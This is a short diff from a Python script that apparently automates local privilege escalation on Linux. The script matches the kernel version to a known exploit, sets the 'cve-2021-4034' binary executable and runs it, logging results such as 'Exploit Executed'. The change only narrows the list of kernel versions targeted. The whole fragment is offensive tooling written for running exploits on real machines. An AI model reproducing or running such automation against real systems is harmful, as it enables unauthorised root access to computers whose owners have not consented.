@@ -95,7 +95,7 @@ if operating_system == "Linux":
             print(child_process_output)
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
         
-        elif kernel_name1 == "5.14.0" or kernel_name1 == "5.10.0" or kernel_name1 == "5.15.0":
+        elif kernel_name1 == "5.14.0" or kernel_name1 == "5.10.0":
             st = os.stat('cve-2021-4034')
             os.chmod('cve-2021-4034', st.st_mode | stat.S_IEXEC)
             args = ["./cve-2021-4034"]
